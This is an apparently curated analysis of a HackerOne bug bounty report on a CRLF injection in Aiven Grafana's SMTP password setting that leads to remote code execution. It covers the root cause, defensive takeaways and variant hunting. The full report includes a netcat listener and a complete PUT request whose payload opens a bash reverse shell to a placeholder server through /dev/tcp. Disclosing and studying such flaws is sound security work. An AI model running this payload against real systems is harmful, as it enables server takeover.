# Grafana RCE via SMTP Server Parameter Injection

## Metadata
- **Source:** HackerOne
- **Report:** 1200647 | https://hackerone.com/reports/1200647
- **Submitted:** 2021-05-18
- **Reporter:** jarij
- **Program:** Aiven (Grafana)
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** CRLF Injection, Configuration Parameter Injection, Remote Code Execution, Input Validation Failure
- **CVEs:** None
- **Category:** memory-binary

## Summary
A CRLF injection vulnerability in the SMTP server password configuration parameter allows attackers to inject arbitrary configuration directives. By injecting plugin configuration parameters, attackers can modify the rendering_args of the Grafana image renderer to achieve remote code execution on the Grafana server.

## Attack scenario
1. Attacker authenticates to Aiven console with valid credentials or leverages an exposed API token
2. Attacker sends a PUT request to modify the Grafana instance's SMTP configuration
3. Attacker injects CRLF characters followed by malicious plugin configuration in the SMTP password field
4. The injected configuration modifies rendering_args to include arbitrary bash commands with command substitution
5. When the /render/x endpoint is accessed, the image renderer executes the injected bash command
6. Attacker gains remote code execution on the Grafana server with the process privileges

## Root cause
Insufficient input validation on the SMTP password configuration parameter. The application fails to sanitize or reject CRLF characters and newlines, allowing injection of additional configuration sections. Configuration parsing does not properly isolate configuration scopes or validate the source of injected directives.

## Attacker mindset
An authenticated attacker seeks to escalate privileges by breaking out of the intended configuration scope. By recognizing that configuration files use newline-delimited sections, the attacker injects additional sections to modify security-critical settings (rendering_args) that execute external commands. The attacker chains parameter injection with the image rendering functionality to achieve code execution.

## Defensive takeaways
- Implement strict input validation on all configuration parameters, rejecting CRLF and newline characters in fields that should not contain them
- Use structured configuration formats (JSON, YAML) with proper parsing libraries rather than plaintext with delimiters prone to injection
- Apply allowlist validation for configuration parameters with character restrictions at the API layer
- Sanitize and escape configuration values before writing to configuration files
- Implement proper configuration isolation - prevent user-controlled input in one section from affecting other sections
- Apply principle of least privilege to rendering engine processes - restrict command execution capabilities
- Implement comprehensive input validation testing specifically for newline and special character injection
- Monitor configuration changes and log modifications to sensitive parameters like rendering_args

## Variant hunting
Check other configuration parameters in SMTP settings (host, port, from_address, username) for similar injection vulnerabilities
Review all API endpoints that modify configuration files for CRLF injection in text fields
Audit other plugin configurations in Grafana for similar rendering_args or command execution parameters exploitable via injection
Examine environment variable configuration parameters that might be injectable
Test datasource, authentication, and alert configuration endpoints for similar parameter injection
Review TLS/SSL certificate path parameters that might execute commands
Check webhook URL configurations and similar external service parameters

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1203 - Exploitation for Client Execution
- T1059 - Command and Scripting Interpreter
- T1548 - Abuse Elevation Control Mechanism
- T1574 - Hijack Execution Flow

## Notes
This is a follow-up to vulnerability #1180653 with a different injection vector (SMTP password vs. another parameter). The vulnerability demonstrates how CRLF injection in configuration parameters can have severe consequences when the configuration parser doesn't properly scope sections. The attack requires authentication to the Aiven console API. The use of bash command substitution ($IFS for space bypass) shows sophistication in payload crafting. Similar vulnerabilities likely exist in other configuration parameters. This type of vulnerability is particularly dangerous in multi-tenant SaaS environments like Aiven.

## Full report
<details><summary>Expand</summary>

## Summary:

This report is similar to [#1180653](https://hackerone.com/reports/1180653), except with different parameter injection entrypoint.

SMTP server password configuration setting accepts new line characters. This can be used to set non-exported configuration variables. Using this CRLF-injection, the `rendering_args` of grafana image renderer can be modified which leads to code execution on the Grafana server.

## Steps To Reproduce:

1.Create Aiven Grafana instance
2.Setup netcat listener on your server: `nc -n -lvp 4444`
3.Send the following request to the grafana instance, replace place holders. The aivenv1 token can be retrieved by inspecting the browser traffic.
4. Browse to https://INSTANCE_SUBDOMAIN.aivencloud.com/render/x to trigger the exploit.

```http
PUT /v1/project/PROJECT_NAME/service/GRAFANA_INSTANCE_NAME HTTP/1.1
Host: console.aiven.io
Connection: keep-alive
Accept: application/json
Authorization: aivenv1 AIVEN_TOKEN_HERE
X-Aiven-Client-Version: aiven-console/3.5.1-1104.g2809991854
Content-Type: application/json
Origin: https://console.aiven.io

{
    "user_config": {
        "smtp_server": {
            "host": "example.org",
            "port": 1,
            "from_address": "x@examle.org",
            "password": "x\r\n[plugin.grafana-image-renderer]\r\nrendering_args=--renderer-cmd-prefix=bash -c bash$IFS-l$IFS>$IFS/dev/tcp/SERVER_IP/4444$IFS0<&1$IFS2>&1"
        }
    }
}
```

## Impact

Command execution on the grafana server. Access and modify data on the grafana server and possibly the attacker could pivot into other servers on the aiven network.

</details>

---
*Analysed by Claude on 2026-05-11*
